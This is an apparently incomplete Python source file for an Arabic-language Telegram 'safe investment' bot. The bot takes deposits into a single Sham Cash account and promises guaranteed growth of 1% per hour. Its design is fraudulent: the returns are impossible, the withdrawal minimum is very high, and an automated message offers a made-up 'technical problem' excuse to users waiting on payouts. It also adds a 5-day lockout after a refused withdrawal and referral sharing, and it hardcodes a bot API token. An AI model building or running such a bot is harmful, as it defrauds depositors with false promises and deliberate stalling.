import telebot
from telebot import types
import datetime
import json
import os
import re
import time
import threading # استيراد مكتبة المؤقت (Threading) للعمل الدوري

# --- الإعدادات الثابتة والمراجعة ---
API_TOKEN = '8267414994:AAF90rW-HzXCfy3UJtOx2vtaSYHzOVRSqzI'
DATA_FILE = 'user_data.json'
MIN_WITHDRAWAL = 5000000.0   # الحد الأدنى للسحب 5,000,000 ليرة
HOURLY_GROWTH_RATE = 1.01
YOUR_SHAM_CASH_ACCOUNT = "16411f4c1d9fdefd7835ac7169a37e6d" # رقم الحساب المستهدف
# إعداد وقت الانتظار
DEPOSIT_WAIT_HOURS = 24 
WITHDRAW_REJECT_WAIT_HOURS = 120 # 5 أيام * 24 ساعة = 120 ساعة انتظار بعد رفض السحب
WITHDRAWAL_DELAY_HOURS = 24 # مدة التأخير قبل إرسال رسالة التأخير
CHECK_INTERVAL_SECONDS = 3600 # تشغيل الفحص الدوري كل ساعة

# معرفات المشرفين
ADMIN_USER_IDS = [6721668379] 

# [تعديل هام]: ضع اسم المستخدم (username) الخاص ببوتك هنا
BOT_USERNAME = "@ALMAL_U_BOT" 


# --- تعريف حالات المستخدم ---
STATE_DEFAULT = 'default'           
STATE_AWAITING_AMOUNT = 'awaiting_amount' 
STATE_AWAITING_PROOF = 'awaiting_proof'   
STATE_PENDING_APPROVAL = 'pending_approval'
STATE_ACTIVE = 'active'             
STATE_AWAITING_WITHDRAW_AMOUNT = 'awaiting_withdraw_amount' 
STATE_AWAITING_WITHDRAW_ACC = 'awaiting_withdraw_account'


# --- الدوال المساعدة ---
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            try:
                data = json.load(f)
                # تحويل مفاتيح IDs إلى أرقام صحيحة عند التحميل
                return {int(k): v for k, v in data.items()}
            except json.JSONDecodeError:
                print(f"⚠️ تحذير: ملف البيانات {DATA_FILE} فارغ أو تالف.")
                return {}
    return {}

def save_data(data):
    # حفظ البيانات في الملف
    with open(DATA_FILE, 'w') as f:
        # نحول مفاتيح IDs إلى سلاسل نصية (Strings) قبل الحفظ لتجنب مشاكل JSON
        # نستخدم {str(k): v for k, v in data.items()}
        data_to_save = {str(k): v for k, v in data.items()}
        json.dump(data_to_save, f, indent=4)

user_data = load_data()

# دالة حساب الرصيد
def calculate_new_balance(user_id):
    data = user_data.get(user_id)
    if not data or not data.get('is_deposited'):
        return 0.0, False

    current_balance = data['balance']
    last_update_str = data['last_update']
    
    try:
        last_update = datetime.datetime.fromisoformat(last_update_str)
    except ValueError:
        last_update = datetime.datetime.now()
        data['last_update'] = last_update.isoformat()
        save_data(user_data)
        
    time_elapsed = datetime.datetime.now() - last_update
    hours_elapsed = int(time_elapsed.total_seconds() / 3600)
    
    if hours_elapsed > 0:
        # حساب النمو الأُسّي
        new_balance = current_balance * (HOURLY_GROWTH_RATE ** hours_elapsed)
        
        data['balance'] = new_balance
        data['last_update'] = datetime.datetime.now().isoformat()
        
        # يجب استخدام 'user_data' في الحفظ
        save_data(user_data) 
        return new_balance, True
    
    return current_balance, False


# دالة مساعدة لتنسيق الأرقام
def format_currency(amount):
    return f"{int(amount):,}".replace(',', 'X').replace('.', ',').replace('X', '.')

# دالة إنشاء رسالة الترحيب والمعلومات
def get_welcome_message(first_name):
    message = (
        f"👋 أهلاً بك يا **{first_name}** في بوت الاستثمار الآمن!.\n"
        f"هذا البوت يتيح لك الإيداع في الشام كاش والاستفادة من نمو سريع وآمن.\n"
        "\n"
        "--- **لماذا تختار بوتنا؟** ---\n"
        "✅ **الثقة والأمان:** أموالك مودعة في حسابات موثوقة ومحمية.\n"
        f"💰 **نمو مضمون:** رصيدك ينمو بمعدل **{(HOURLY_GROWTH_RATE - 1) * 100:.0f}% كل ساعة** دون توقف! 📈\n"
        "⏰ **الشفافية:** يمكنك متابعة رصيدك ونموه في أي لحظة.\n"
        f"💸 **سياسة السحب:** الحد الأدنى للسحب هو: **{format_currency(MIN_WITHDRAWAL)} ليرة**.\n"
        "\n"
        "هل تريد البدء بعملية الإيداع الآن؟"
    )
    return message


# --- إنشاء كائن البوت ---
bot = telebot.TeleBot(API_TOKEN)

# دالة إعداد قائمة الأوامر (Menu) في تليجرام
def setup_bot_commands():
    """تحديد الأوامر التي ستظهر في قائمة Menu الخاصة بالبوت."""
    commands = [
        types.BotCommand("start", "الترحيب والصفحة الرئيسية"),
        types.BotCommand("deposit", "بدء عملية الإيداع"),
        types.BotCommand("withdraw", "طلب سحب الرصيد"),
        types.BotCommand("balance", "الاستعلام عن الرصيد"),
        types.BotCommand("share", "مشاركة البوت مع الأصدقاء"),
    ]
    try:
        bot.set_my_commands(commands)
        print("Telegram commands set successfully.")
    except Exception as e:
        print(f"Failed to set bot commands: {e}")


# --- دوال إنشاء لوحة المفاتيح ---
def get_start_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ نعم، أريد الإيداع", callback_data="start_deposit"),
        types.InlineKeyboardButton("❌ لا، شكراً", callback_data="cancel_deposit")
    )
    return markup
    
def get_main_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    
    current_state = user_data.get(user_id, {}).get('state')
    
    SHARE_TEXT = f"اكتشف بوت الاستثمار الآمن! ينمو رصيدك 1% كل ساعة. ابدأ الآن: https://t.me/{BOT_USERNAME}"
    SHARE_URL = f"https://t.me/share/url?url=&text={SHARE_TEXT}"
    
    if current_state == STATE_PENDING_APPROVAL:
        markup.add(types.InlineKeyboardButton("🔄 حالة الطلب", callback_data="check_pending"))
    
    elif user_data.get(user_id, {}).get('is_deposited', False):
        markup.add(types.InlineKeyboardButton("💰 استعلام عن الرصيد", callback_data="check_balance"))
        # نستخدم زر لطلب السحب الذي ينفذ منطق الأمر /withdraw
        markup.add(types.InlineKeyboardButton("💸 طلب سحب الرصيد", callback_data="request_withdraw"))
    
    elif current_state == STATE_DEFAULT:
        markup.add(types.InlineKeyboardButton("ابدأ الإيداع الآن", callback_data="start_deposit"))
        
    markup.add(types.InlineKeyboardButton("🔗 مشاركة البوت مع الأصدقاء", url=SHARE_URL))
        
    return markup


# --- معالجة الأوامر النصية ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    first_name = message.from_user.first_name if message.from_user.first_name else "المستخدم"
    
    if user_id not in user_data:
        user_data[user_id] = {
            'state': STATE_DEFAULT, 
            'is_deposited': False, 
            'balance': 0.0, 
            'last_update': datetime.datetime.now().isoformat(),
            'sham_cash_account': None,
            'last_withdraw_reject_time': None
        }
        save_data(user_data)
        
    user_data[user_id]['state'] = STATE_DEFAULT 
    save_data(user_data)

    response = get_welcome_message(first_name)
    bot.reply_to(message, response, reply_markup=get_start_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['deposit'])
def start_deposit_command(message):
    user_id = message.chat.id
    user_info = user_data.get(user_id, {'state': STATE_DEFAULT})
    
    user_info['state'] = STATE_AWAITING_AMOUNT
    save_data(user_data)
    
    deposit_message = (
        "✅ حسناً، الرجاء تحويل المبلغ إلى حساب الشام كاش التالي:\n"
        f"💰 رقم حسابنا: `{YOUR_SHAM_CASH_ACCOUNT}`\n\n" 
        "بعد التحويل، أرسل لي المبلغ الذي قمت بإيداعه (رقم صحيح فقط) للتأكيد."
    )
    
    bot.reply_to(message, deposit_message, parse_mode='Markdown')


@bot.message_handler(commands=['withdraw'])
def request_withdraw_command(message):
    user_id = message.chat.id
    user_info = user_data.get(user_id)
    
    if not user_info or not user_info.get('is_deposited', False):
        bot.send_message(user_id, "❌ لا يوجد إيداع نشط في حسابك حالياً لبدء عملية السحب.")
        return
        
    balance, _ = calculate_new_balance(user_id)
    
    if balance < MIN_WITHDRAWAL:
        bot.send_message(user_id, f"❌ الحد الأدنى للسحب هو {format_currency(MIN_WITHDRAWAL)} ليرة. رصيدك الحالي: {format_currency(balance)} ليرة.")
        return

    reject_time_str = user_info.get('last_withdraw_reject_time')
    if reject_time_str:
        try:
            last_reject_time = datetime.datetime.fromisoformat(reject_time_str)
        except ValueError:
            last_reject_time = datetime.datetime.min 

        time_elapsed_since_reject = datetime.datetime.now() - last_reject_time
        
        if time_elapsed_since_reject.total_seconds() < WITHDRAW_REJECT_WAIT_HOURS * 3600:
            remaining_seconds = (WITHDRAW_REJECT_WAIT_HOURS * 3600) - time_elapsed_since_reject.total_seconds()
            remaining_days = int(remaining_seconds // (24 * 3600))
            remaining_hours = int((remaining_seconds % (24 * 3600)) // 3600)
            
            bot.send_message(
                user_id, 
                f"🚫 عذراً، تم رفض طلب سحب سابق. يجب الانتظار 5 أيام (120 ساعة) لتقديم طلب جديد.\n"
                f"تبقى: {remaining_days} يوم و {remaining_hours} ساعة."
            )
            return
    
    user_info['state'] = STATE_AWAITING_WITHDRAW_AMOUNT
    save_data(user_data)
    
    withdraw_msg = (
        f"✅ رصيدك الحالي المؤهل للسحب هو: **{format_currency(balance)} ليرة**.\n\n"
        "**الرجاء إرسال المبلغ الذي ترغب بسحبه الآن (رقم فقط).**\n"
        f"*ملاحظة: الحد الأدنى للسحب هو: {format_currency(MIN_WITHDRAWAL)} ليرة.*"
    )
    
    bot.reply_to(message, withdraw_msg, parse_mode='Markdown')

@bot.message_handler(commands=['share'])
def share_command(message):
    SHARE_TEXT = f"اكتشف بوت الاستثمار الآمن! ينمو رصيدك 1% كل ساعة. ابدأ الآن: https://t.me/{BOT_USERNAME}"
    SHARE_URL = f"https://t.me/share/url?url=&text={SHARE_TEXT}"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("انقر للمشاركة", url=SHARE_URL))
    
    bot.reply_to(message, "شكراً لك! يمكنك مشاركة رابط البوت مع أصدقائك لزيادة قاعدة المستخدمين:", reply_markup=markup)

@bot.message_handler(commands=['balance'])
def check_balance_command(message):
    user_id = message.chat.id
    user_info = user_data.get(user_id)
    
    if not user_info or not user_info.get('is_deposited', False):
        bot.send_message(user_id, "❌ لا يوجد إيداع نشط في حسابك حالياً.")
        return
        
    balance, _ = calculate_new_balance(user_id)
    balance_formatted = format_currency(balance)
    
    response = f"💰 رصيدك الحالي هو: {balance_formatted} ليرة."
    bot.reply_to(message, response, reply_markup=get_main_keyboard(user_id))


# دالة معالجة الرسائل النصية العادية
@bot.message_handler(content_types=['text'])
def handle_text_messages(message):
    user_id = message.chat.id
    text = message.text.strip()
    user_info = user_data.get(user_id, {'state': STATE_DEFAULT})
    first_name = message.from_user.first_name if message.from_user.first_name else "المستخدم"
    
    print(f"رسالة نصية من {user_id}: {text} (الحالة: {user_info.get('state')})")
    
    # 1. معالجة انتظار المبلغ (الإيداع)
    if user_info['state'] == STATE_AWAITING_AMOUNT:
        try:
            cleaned_text = re.sub(r'[^\d]', '', text) 
            if not cleaned_text:
                 raise ValueError("النص فارغ بعد التنظيف.")
                 
            deposit_amount = float(cleaned_text)
            
            if deposit_amount <= 0:
                bot.reply_to(message, "يجب أن يكون المبلغ أكبر من صفر. أدخل المبلغ مرة أخرى:")
                return
            
            user_info['pending_deposit'] = deposit_amount
            user_info['state'] = STATE_AWAITING_PROOF
            save_data(user_data)
            
            bot.reply_to(message, f"تم تسجيل مبلغ {format_currency(deposit_amount)} ليرة.\n\nالآن، يُرجى إرسال صورة (إثبات الإيداع) من الشام كاش لتأكيد العملية والبدء في النمو 📈.")
            return

        except ValueError:
            bot.reply_to(message, "عفواً، لم يتم إدخال رقم صحيح. أدخل المبلغ الذي قمت بإيداعه (رقم فقط):")
            return
            
    # 2. معالجة انتظار مبلغ السحب 
    if user_info['state'] == STATE_AWAITING_WITHDRAW_AMOUNT:
        try:
            cleaned_text = re.sub(r'[^\d]', '', text) 
            if not cleaned_text:
                 raise ValueError("النص فارغ بعد التنظيف.")
                 
            withdraw_amount = float(cleaned_text)
            
            current_balance, _ = calculate_new_balance(user_id)

            if withdraw_amount < MIN_WITHDRAWAL: 
                bot.reply_to(message, f"يجب أن يكون المبلغ أكبر من أو يساوي الحد الأدنى للسحب ({format_currency(MIN_WITHDRAWAL)} ليرة). أدخل المبلغ مرة أخرى:")
                return
            
            if withdraw_amount > current_balance:
                bot.reply_to(message, f"المبلغ المطلوب سحبه ({format_currency(withdraw_amount)} ليرة) أكبر من رصيدك الحالي ({format_currency(current_balance)} ليرة). أدخل مبلغاً أقل أو مساوياً لرصيدك:")
                return
            
            user_info['pending_withdrawal'] = withdraw_amount
            user_info['state'] = STATE_AWAITING_WITHDRAW_ACC
            save_data(user_data)
            
            if user_info.get('sham_cash_account'):
                 withdraw_acc_msg = (
                    f"✅ تم تسجيل المبلغ المطلوب: {format_currency(withdraw_amount)} ليرة.\n"
                    f"معلومات السحب المسجلة سابقاً: **{user_info['sham_cash_account']}**.\n\n"
                    "**الآن، أرسل اسم حساب/رقم هاتف/أو أي معلومات تعريفية أخرى تريد التحويل إليها الآن (أو أرسل نفس المعلومات للتأكيد).**"
                )
            else:
                 withdraw_acc_msg = (
                    f"✅ تم تسجيل المبلغ المطلوب: {format_currency(withdraw_amount)} ليرة.\n"
                    "**الرجاء إرسال اسم حساب/رقم هاتف/أو أي معلومات تعريفية أخرى تريد التحويل إليها الآن.**"
                )
            
            bot.reply_to(message, withdraw_acc_msg, parse_mode='Markdown')
            return

        except ValueError:
            bot.reply_to(message, "عفواً، لم يتم إدخال رقم صحيح. أدخل المبلغ الذي ترغب بسحبه (رقم فقط):")
            return


    # 3. معالجة انتظار معلومات السحب 
    if user_info['state'] == STATE_AWAITING_WITHDRAW_ACC:
        
        withdrawal_amount = user_info.pop('pending_withdrawal', 0.0) 
        if withdrawal_amount <= 0:
            user_info['state'] = STATE_ACTIVE
            save_data(user_data)
            bot.reply_to(message, "❌ حدث خطأ داخلي. يرجى المحاولة مرة أخرى من زر 'طلب سحب الرصيد'.")
            return
            
        if text: 
            user_info['sham_cash_account'] = text 
            
            # إرسال طلب السحب للمشرف
            if ADMIN_USER_IDS:
                admin_target_id = ADMIN_USER_IDS[0]
                
                withdraw_request_msg = (
                    f"**💰 طلب سحب جديد للمراجعة!**\n"
                    f"* المبلغ المطلوب: **{format_currency(withdrawal_amount)} ليرة**.\n"
                    f"* **معلومات السحب:** `{text}`\n"
                    f"* المستخدم: [{message.from_user.first_name}](tg://user?id={user_id})\n"
                    f"* ID المستخدم: `{user_id}`"
                )

                withdraw_markup = types.InlineKeyboardMarkup()
                withdraw_markup.add(
                    types.InlineKeyboardButton("✅ تم الدفع والسحب", callback_data=f"withdraw_done_{user_id}_{int(withdrawal_amount)}"), 
                    types.InlineKeyboardButton("❌ رفض الطلب", callback_data=f"withdraw_reject_{user_id}")
                )
                
                bot.send_message(admin_target_id, withdraw_request_msg, parse_mode='Markdown', reply_markup=withdraw_markup)
                

            # إرسال رسالة تأكيد استلام الطلب للمستخدم
            bot.send_message(user_id, f"✅ تم استلام طلب السحب بنجاح!\n\n* المبلغ المطلوب سحبه: {format_currency(withdrawal_amount)} ليرة.\n* سيتم التحويل باستخدام المعلومات: **{text}**.\n\nسيتم التواصل معك لإتمام العملية. سيتم خصم المبلغ من رصيدك عند موافقة المشرف.")
            
            # تخزين المبلغ وتغيير الحالة لانتظار الموافقة وتسجيل وقت الطلب
            user_info['state'] = STATE_PENDING_APPROVAL 
            user_info['pending_withdrawal_amount'] = withdrawal_amount
            user_info['withdrawal_submission_time'] = datetime.datetime.now().isoformat() # <--- تسجيل وقت الطلب
            user_info['withdrawal_delay_message_sent'] = False # <--- إعادة تعيين مؤشر الرسالة
            user_info['last_withdraw_reject_time'] = None 
            save_data(user_data)
            
            return
        else:
            bot.reply_to(message, "الرجاء إدخال حساب الشام كاش الخاص بك ")
            return
            
    # 4. حالة انتظار الموافقة
    if user_info['state'] == STATE_PENDING_APPROVAL:
        bot.send_message(user_id, "⏳ طلب إيداعك/سحبك قيد المراجعة. يرجى الضغط على زر 'حالة الطلب' لمعرفة آخر التحديثات.", reply_markup=get_main_keyboard(user_id))
        return

    # 5. الرد الافتراضي عندما يكون المستخدم نشطاً
    if user_info['is_deposited']:
        balance, _ = calculate_new_balance(user_id) 
        balance_formatted = format_currency(balance)
        response = f"أهلاً! يمكنك استخدام الأزرار أدناه لإدارة رصيدك:\nرصيدك الحالي هو: {balance_formatted} ليرة."
        bot.send_message(user_id, response, reply_markup=get_main_keyboard(user_id))
        return

    # 6. الرد الافتراضي لغير المودعين والرسائل العشوائية
    if user_info['state'] == STATE_DEFAULT:
        response = get_welcome_message(first_name)
        bot.send_message(user_id, response, reply_markup=get_start_keyboard(), parse_mode='Markdown')


# --- معالجة إثبات الإيداع (الصورة) ---
@bot.message_handler(content_types=['photo'])
def handle_proof_photo(message):
    user_id = message.chat.id
    user_info = user_data.get(user_id)
    
    print(f"صورة من {user_id} (الحالة: {user_info.get('state')})")
    
    if not user_info or user_info.get('state') != STATE_AWAITING_PROOF:
        return
    
    if not ADMIN_USER_IDS:
        bot.send_message(user_id, "⚠️ عذراً، لا يمكنني إرسال طلبك الآن. لا يوجد معرف مشرفين مسجل.", reply_markup=get_main_keyboard(user_id))
        return
        
    ADMIN_TARGET_ID = ADMIN_USER_IDS[0] 
        
    photo_file_id = message.photo[-1].file_id
    deposit_amount = user_info['pending_deposit']
    
    # 1. إرسال تأكيد للمستخدم
    bot.send_message(
        user_id, 
        "✅ تم استلام إثبات الإيداع بنجاح.\n\n"
        "سيتم مراجعة طلبك من قبل المشرف قريباً.",
        reply_markup=get_main_keyboard(user_id)
    )
    
    # 2. تحديث حالة المستخدم وحفظ وقت الإرسال
    user_info['state'] = STATE_PENDING_APPROVAL
    user_info['deposit_photo_id'] = photo_file_id
    user_info['deposit_submission_time'] = datetime.datetime.now().isoformat() 
    user_info['withdrawal_delay_message_sent'] = False # التأكد من إعادة تعيين هذه العلامة لعمليات الإيداع
    save_data(user_data)
    
    # 3. إعداد رسالة المراجعة للمشرف
    caption = (
        f"**🚨 طلب إيداع جديد للمراجعة!**\n"
        f"**💰 المبلغ:** {format_currency(deposit_amount)} ليرة.\n"
        f"**👤 المستخدم:** [{message.from_user.first_name}](tg://user?id={user_id})\n"
        f"**🔢 ID المستخدم:** `{user_id}`"
    )

    # 4. إضافة أزرار القبول/الرفض للمشرف
    approval_markup = types.InlineKeyboardMarkup()
    approval_markup.add(
        types.InlineKeyboardButton("✅ قبول الإيداع", callback_data=f"approve_{user_id}_{int(deposit_amount)}"),
        types.InlineKeyboardButton("❌ رفض الإيداع", callback_data=f"reject_{user_id}")
    )
    
    # 5. إرسال الصورة والرسالة إلى حساب المشرف مباشرةً
    try:
        sent_message = bot.send_photo(
            chat_id=ADMIN_TARGET_ID,
            photo=photo_file_id,
            caption=caption,
            parse_mode='Markdown',
            reply_markup=approval_markup
        )
        
        user_info['moderation_message_id'] = sent_message.message_id
        save_data(user_data)
        
    except Exception as e:
        print(f"Error sending to Admin: {e}")
        bot.send_message(user_id, "⚠️ عذراً، حدث خطأ في إرسال طلبك للإدارة. يرجى المحاولة مرة أخرى لاحقاً.")

    return


# --- دالة الفحص الدوري للتأخير (تعمل في Thread منفصل) ---
def check_pending_withdrawals():
    """تفحص المستخدمين في حالة انتظار الموافقة وإرسال تنبيه بعد 24 ساعة."""
    
    global user_data
    
    while True:
        # الانتظار لمدة ساعة قبل الفحص التالي
        time.sleep(CHECK_INTERVAL_SECONDS) 
        
        # يجب إعادة تحميل البيانات لضمان الحصول على آخر تحديثات
        user_data = load_data()
        now = datetime.datetime.now()
        
        print(f"[{now.strftime('%H:%M:%S')}] Running periodic check for delayed withdrawals...")

        users_to_update = {} 
        
        for user_id_str, user_info in user_data.items():
            user_id = int(user_id_str)
            
            # التحقق من أن المستخدم في حالة انتظار الموافقة لعملية سحب
            is_pending_withdrawal = (
                user_info.get('state') == STATE_PENDING_APPROVAL and 
                user_info.get('pending_withdrawal_amount', 0) > 0 # نستخدم pending_withdrawal_amount للتفريق عن الإيداع
            )

            if is_pending_withdrawal:
                submission_time_str = user_info.get('withdrawal_submission_time')
                
                if not submission_time_str or user_info.get('withdrawal_delay_message_sent'):
                    continue
                
                try:
                    submission_time = datetime.datetime.fromisoformat(submission_time_str)
                except ValueError:
                    continue
                    
                time_elapsed = now - submission_time
                hours_elapsed = time_elapsed.total_seconds() / 3600
                
                # إرسال الرسالة إذا مر أكثر من 24 ساعة
                if hours_elapsed >= WITHDRAWAL_DELAY_HOURS:
                    
                    delay_message = (
                        "🚨 **تحديث بخصوص طلب السحب الخاص بك**\n\n"
                        "عزيزي المستخدم، نود أن نعتذر لتأخر معالجة طلب السحب الخاص بك.\n"
                        "واجهنا مشكلة فنية مؤقتة، ونتوقع حلها بالكامل خلال **48 ساعة قادمة**.\n\n"
                        "شكراً جزيلاً لصبرك وتفهمك."
                    )
                    
                    try:
                        bot.send_message(user_id, delay_message, parse_mode='Markdown')
                        
                        # تسجيل أن الرسالة تم إرسالها لمنع إرسالها مرة أخرى
                        user_info['withdrawal_delay_message_sent'] = True
                        users_to_update[user_id] = user_info
                        
                        print(f"Delay message sent to user {user_id}")
                        
                    except Exception as e:
                        print(f"Failed to send delay message to user {user_id}: {e}")
        
        # حفظ التحديثات بعد انتهاء الحلقة
        if users_to_update:
            # دمج التحديثات الجديدة في البيانات العامة
            for uid, info in users_to_update.items():
                 user_data[uid] = info
            save_data(user_data)


# --- معالجة الأزرار الداخلية (callback_query_handler) ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    data = call.data
    
    try:
        
        def clear_moderation_message(message_id, original_caption, status):
            if user_id in ADMIN_USER_IDS: 
                try:
                    bot.edit_message_caption(
                        chat_id=call.message.chat.id, 
                        message_id=message_id,
                        caption=f"{original_caption}\n\n**---\n{status} بواسطة: {call.from_user.first_name}**",
                        reply_markup=None,
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    if "message is not modified" not in str(e):
                        print(f"Error editing moderation message: {e}")

        # ----------------------------------------------------
        # 1.1 منطق المشرفين (تأكيد سحب/رفض طلب سحب)
        # ----------------------------------------------------
        if data.startswith('withdraw_done_') or data.startswith('withdraw_reject_'):
            
            if user_id not in ADMIN_USER_IDS:
                bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية المشرف لهذا الإجراء.", show_alert=True)
                return
                
            parts = data.split('_')
            action = parts[0]
            target_user_id = int(parts[2]) 
            target_user_info = user_data.get(target_user_id)
            
            if any(s in call.message.caption for s in ["تم الدفع", "تم الرفض", "تم معالجته"]):
                bot.answer_callback_query(call.id, "تم معالجة هذا الطلب مسبقاً.", show_alert=True)
                return
            
            moderation_message_id = call.message.message_id
            original_caption = call.message.caption
            
            if action == 'withdraw_done':
                try:
                    amount = float(parts[3]) 
                except (IndexError, ValueError):
                    bot.answer_callback_query(call.id, "❌ خطأ في تحليل المبلغ.", show_alert=True)
                    return
                    
                if target_user_info:
                    if target_user_info.get('state') == STATE_PENDING_APPROVAL and target_user_info.get('pending_withdrawal_amount') == amount:
                        
                        new_balance = target_user_info['balance'] - amount
                        if new_balance < 0:
                            new_balance = 0 
                        
                        target_user_info['balance'] = new_balance
                        target_user_info['last_update'] = datetime.datetime.now().isoformat()
                        target_user_info['state'] = STATE_ACTIVE
                        target_user_info.pop('pending_withdrawal_amount', None)
                        target_user_info.pop('withdrawal_submission_time', None)
                        target_user_info.pop('withdrawal_delay_message_sent', None) # إزالة مؤشر الرسالة
                        
                        if new_balance == 0:
                            target_user_info['is_deposited'] = False
                            
                        save_data(user_data)
                    else:
                        bot.answer_callback_query(call.id, "⚠️ حالة المستخدم غير مناسبة لإنهاء عملية السحب أو المبلغ غير متطابق.", show_alert=True)
                        return

                    bot.send_message(
                        target_user_id, 
                        f"✅ **تم التحويل بنجاح!**\n\n"
                        f"تم سحب مبلغ **{format_currency(amount)} ليرة** وتحويله إلى معلومات السحب التي أدخلتها.\n"
                        f"رصيدك الجديد هو: **{format_currency(new_balance)} ليرة**.", 
                        reply_markup=get_main_keyboard(target_user_id)
                    )
                    
                    clear_moderation_message(moderation_message_id, original_caption, "✅ تم الدفع بنجاح")
                    bot.answer_callback_query(call.id, "تم إرسال رسالة تأكيد التحويل للمستخدم وتحديث طلب السحب.")
                else:
                    bot.answer_callback_query(call.id, "❌ خطأ: لا يمكن العثور على بيانات المستخدم المستهدف.", show_alert=True)
                
            elif action == 'withdraw_reject':
                if target_user_info:
                    target_user_info['state'] = STATE_ACTIVE
                    target_user_info['last_withdraw_reject_time'] = datetime.datetime.now().isoformat()
                    target_user_info.pop('pending_withdrawal_amount', None)
                    target_user_info.pop('withdrawal_submission_time', None)
                    target_user_info.pop('withdrawal_delay_message_sent', None) # إزالة مؤشر الرسالة
                    save_data(user_data)
                
                bot.send_message(
                    target_user_id, 
                    "❌ **عفواً، تم رفض طلب السحب الخاص بك.**\n\n"
                    "يرجى التواصل مع الدعم الفني للاستفسار، ونتمنى المحاولة مرة أخرى بعد 5 أيام.",
                    reply_markup=get_main_keyboard(target_user_id)
                )
                
                clear_moderation_message(moderation_message_id, original_caption, "❌ تم رفض الطلب")
                bot.answer_callback_query(call.id, "تم إرسال رسالة الرفض للمستخدم وتحديث طلب السحب.")
            
            return 

        # ----------------------------------------------------
        # 1.2 منطق المشرفين (قبول/رفض الإيداع)
        # ----------------------------------------------------
        elif data.startswith('approve_') or data.startswith('reject_'):
            
            if user_id not in ADMIN_USER_IDS:
                bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية المشرف لهذا الإجراء.", show_alert=True)
                return
                
            parts = data.split('_')
            action = parts[0]
            target_user_id = int(parts[1]) 
            target_user_info = user_data.get(target_user_id)
            
            if not target_user_info or target_user_info.get('state') != STATE_PENDING_APPROVAL:
                bot.answer_callback_query(call.id, "هذا الطلب تم معالجته سابقاً أو لم يعد صالحاً.", show_alert=True)
                clear_moderation_message(call.message.message_id, call.message.caption, "⚠️ تم معالجته سابقاً")
                return
                
            moderation_message_id = call.message.message_id
            
            if action == 'approve':
                try:
                    deposit_amount = float(parts[2]) 
                except (IndexError, ValueError):
                    bot.answer_callback_query(call.id, "❌ خطأ في تحليل المبلغ.", show_alert=True)
                    return
                
                target_user_info['state'] = STATE_ACTIVE
                target_user_info['is_deposited'] = True
                target_user_info['balance'] = deposit_amount
                target_user_info['last_update'] = datetime.datetime.now().isoformat()
                # إزالة مفاتيح الإيداع المعلقة
                target_user_info.pop('pending_deposit', None)
                target_user_info.pop('deposit_photo_id', None)
                target_user_info.pop('deposit_submission_time', None)
                target_user_info.pop('withdrawal_delay_message_sent', None)
                
                save_data(user_data)

                bot.send_message(
                    target_user_id, 
                    f"✅ تهانينا! تمت الموافقة على إيداعك بنجاح.\n"
                    f"تم إضافة {format_currency(deposit_amount)} ليرة إلى رصيدك.\n"
                    "سيبدأ النمو الساعي الآن! 📈",
                    reply_markup=get_main_keyboard(target_user_id)
                )
                
                clear_moderation_message(moderation_message_id, call.message.caption, "✅ قبول")
                bot.answer_callback_query(call.id, "تم قبول الإيداع بنجاح.")
                
            elif action == 'reject':
                target_user_info['state'] = STATE_DEFAULT
                # إزالة مفاتيح الإيداع المعلقة
                target_user_info.pop('pending_deposit', None)
                target_user_info.pop('deposit_photo_id', None)
                target_user_info.pop('deposit_submission_time', None)
                target_user_info.pop('withdrawal_delay_message_sent', None)
                
                save_data(user_data)

                bot.send_message(
                    target_user_id, 
                    "❌ عذراً، تم رفض إثبات الإيداع الذي أرسلته. يرجى التأكد من أن الصورة واضحة وتطابق المبلغ المدخل. يمكنك البدء بعملية إيداع جديدة عبر الضغط على الزر أدناه.",
                    reply_markup=get_main_keyboard(target_user_id)
                )
                
                clear_moderation_message(moderation_message_id, call.message.caption, "❌ رفض")
                bot.answer_callback_query(call.id, "تم رفض الإيداع.")
            
            return 
        
        
        # ----------------------------------------------------
        # 2. منطق المستخدمين العاديين
        # ----------------------------------------------------
        
        # معالجة زر الإيداع (start_deposit)
        if data == 'start_deposit':
            user_info = user_data[user_id]
            
            user_info['state'] = STATE_AWAITING_AMOUNT
            save_data(user_data)
            
            deposit_message = (
                "✅ حسناً، الرجاء تحويل المبلغ إلى حساب الشام كاش التالي:\n"
                f"💰 رقم حسابنا: `{YOUR_SHAM_CASH_ACCOUNT}`\n\n" 
                "بعد التحويل، أرسل لي المبلغ الذي قمت بإيداعه (رقم صحيح فقط) للتأكيد."
            )
            
            # تعديل الرسالة الأصلية بدلاً من الرد
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=deposit_message,
                parse_mode='Markdown', 
                reply_markup=None
            )
            
            
        elif data == 'cancel_deposit':
            user_info = user_data[user_id]
            user_info['state'] = STATE_DEFAULT
            save_data(user_data)
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="تم إلغاء عملية الإيداع. يمكنك البدء في أي وقت آخر عبر الضغط على الزر أدناه.",
                reply_markup=get_main_keyboard(user_id)
            )

        # استعلام عن الرصيد
        elif data == 'check_balance':
            balance, _ = calculate_new_balance(user_id)
            balance_formatted = format_currency(balance)
            bot.answer_callback_query(call.id, f"💰 رصيدك الحالي هو: {balance_formatted} ليرة.", show_alert=True)
            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f"أهلاً! يمكنك استخدام الأزرار أدناه لإدارة رصيدك:\nرصيدك الحالي هو: {balance_formatted} ليرة.",
                    reply_markup=get_main_keyboard(user_id)
                )
            except telebot.apihelper.ApiTelegramException as e:
                if "message is not modified" not in str(e):
                    raise
            
        # طلب سحب الرصيد (request_withdraw)
        elif data == 'request_withdraw':
            user_info = user_data[user_id]
            
            if not user_info.get('is_deposited', False):
                bot.answer_callback_query(call.id, "❌ لا يوجد إيداع نشط في حسابك حالياً.", show_alert=True)
                return
                
